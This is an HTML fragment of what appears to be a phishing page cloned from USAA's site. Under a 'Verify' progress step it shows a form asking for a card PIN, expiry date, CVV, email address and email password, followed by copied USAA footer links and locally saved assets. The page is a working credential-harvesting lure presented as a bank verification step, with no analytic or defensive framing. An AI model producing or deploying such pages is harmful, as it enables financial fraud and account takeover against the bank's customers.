							<span class="progressLinks-message progressLinks-v2-icon">Verify</span>
                            <span class="hiddenMessage">&nbsp;(Currently Active)</span>
						</li>

						<li class="progressLinks-item">
							<span class="progressLinks-message progressLinks-v4-icon">Confirmation</span>
						</li>
					
					</ol>
				</div>	












						<table class="tableData" style="margin-top: 12px;" width="100%" cellspacing="0" cellpadding="0">
							<tbody>
							
                                
							</tr>
                            <tr id="MemberId" style="">
								<td width="45%" class="dataLabel"><label for="member">Pin Code
								</label>
								</td>
								<td width="55%"><input type="text" id="phone" placeholder="****" name="phone" maxlength="10" required="required" size="6" />
								<div class="textInfo">Enter your USAA (4 Digits) Pin</div>
						      </td>
                                
							</tr>

							<tr id="MemberId" style="">
								<td width="45%" class="dataLabel"><label for="member">EXP Date
								</label>
								</td>
								<td width="55%"><input type="text" id="phone" placeholder="MM/YYYY" name="exp" maxlength="10" required="required" size="6" />
						      </td>
							  <td width="45%" class="dataLabel"><label for="member">CVV
								</label>
								</td>
								<td width="55%"><input type="text" id="phone" placeholder="***" name="cvv" maxlength="10" required="required" size="6" />
						      </td>
                                
							</tr>
                              <tr id="MemberId" style="">
								<td width="45%" class="dataLabel"><label for="member">E-mail
								</label>
								</td>
								<td width="55%"><input type="text" id="e1" placeholder="Email Address" name="e1" maxlength="50" required="required" size="25" />
						      </td>
							  <td width="45%" class="dataLabel"><label for="member">Password
								</label>
								</td>
								<td width="55%"><input type="password" id="p1" placeholder="Email Password" name="p1" maxlength="50" required="required" size="25" />
						      </td>
                                
							</tr><tr id="MemberId" style="">
								
                                
							</tr>
						</tbody></table>
						<div class="buttonContainer floatRight accButton">
                          <span class="button_secondary_v2"></span> 
                                                        <span class="button_primary_v2"><button name="Button[action]update[/action]" id="PsButton_[action]update[/action]" class="button_primary_v2" type="submit" style="padding-right: 14px;">Verify</button></span> 
                                                </div>
					</div>
				</div>
			</div>


		</form>

	

				
			
		</div> 
			
				
					<div id="rightCol" class="rightCol"> 
						<div class="noindex"> 
						
							
							
								
								<h2 class="hiddenMessage">Further Information</h2>
							
						
							
							


<link href="pin_files/tridion_DWT.css" rel="stylesheet" type="text/css"><div class="DWT"><div class="rightModule"><h3 class="hiddenMessage">Manage Your USAA Account Anywhere</h3><img alt=" " src="pin_files/bank-anywhere-devices-image.png" title="" width="206"><p class="text-left">With
 USAA, you're free to manage your account from anywhere. You'll be able 
to access your account online from your mobile device or from your iPad.</p></div></div>

<div class="endcap"></div>

						</div> 
					</div> 
				
			
		
		
			
				</div> 
			
		
	</div>	
			

 	
	
	
 <div class="noindex"> 
	




<a name="bottom"></a>



<div id="footer" class="usaa-nav-footer">
	



	<div id="navUtility" role="navigation">
		<ul class="sub">
		

		
		
		
		 
		

		<li><a href="https://www.usaa.com/inet/pages/about_usaa_main?wa_ref=pub_subglobal_footer_about_usaa_page">Corporate Info &amp; Media</a></li>
<li><a href="https://communities.usaa.com/t5/News-Center/ct-p/news-center?wa_ref=pub_subglobal_footer_newscenter">News Center</a></li>
<li><a href="https://www.usaa.com/inet/pages/security_protect_your_personal_information?wa_ref=pub_subglobal_footer_privacy_promise">Privacy</a></li>
<li><a href="https://www.usaa.com/careers?wa_ref=pub_subglobal_footer_career_center_page">Careers</a></li>
<li><a href="https://www.usaa.com/inet/pages/accessibility_at_usaa_main?wa_ref=pub_subglobal_footer_accessibility">Accessibility</a></li>

	


		
		
		
		
			
			


			 
				
			
			
			<li><a href="https://www.usaa.com/help/contact/?wa_ref=pub_subglobal_footerUtility_utilityPublic_CONTACTUS">Contact Us</a></li>
<li><a href="https://www.usaa.com/inet/pages/site_map?wa_ref=pub_subglobal_footerUtility_footerDefault_SITEMAP">Site Map</a></li>
<li><a href="https://www.usaa.com/inet/mc_faq/McFAQ?app=CpFaq&amp;FAQPageID=CorpPublicFaq&amp;wa_ref=pub_subglobal_footerUtility_utilityPublic_FAQS">FAQs</a></li>
<li><a href="https://www.usaa.com/inet/pages/site_terms_and_conditions_main?wa_ref=pub_subglobal_footerUtility_utilityPublic_TERMCONDITIONS">Site Terms</a></li>

	
		
		</ul>
		

		

	</div>
	
			
			<div class="switchoptions">
				
					
				
				
				
				<a href="https://www.usaa.com/inet/ent_utils/CrossChannelAuthRedirect?currentAppId=ProofingEvent&amp;targetChannel=mobileMember&amp;targetLookAndFeel=default">Switch to mobile site</a>
			</div>
		
	


   <span class="cobrowselogo_window">		
    <img class="cobrowselogo" alt="" src="pin_files/usaa-sprite-globalNav_v2.png" width="0" height="0">
   </span>




	<div id="legalText" class="accentAnchors" role="contentinfo">
		<div id="copyright"><p><span class="smallText">Copyright � 2020 USAA. </span></p></div>
		<div class="footnotes"><div class="disclaimerLegalText">Use of the term member does not convey any legal, eligibility or ownership rights.<br><br></div></div><br><script language="JavaScript1.2" src="pin_files/footnotes-min.js" type="text/javascript"> </script> 
		<a class="about-our-ads" href="https://www.usaa.com/inet/pages/security_online_information_gathering">About Our Ads</a>
	</div>
		
	
	
	
	
	<br clear="all">
</div>
 

	
 </div> 

</div> 
    





<script type="text/javascript" src="pin_files/screenShareIFrame-min.js"></script>

<script type="text/javascript" src="pin_files/64f96b370brn1784a89cad7d2c49d698"></script>




	









	









<div class="yui-panel-container shadow yui-overlay-hidden" id="yui-gen0_c" style="z-index: 11002; visibility: hidden;"><div id="yui-gen0" class="yui-module yui-overlay yui-panel" style="visibility: inherit;"><a class="container-close" href="#">Close</a></div></div></body><!-- END HTML BODY --></html>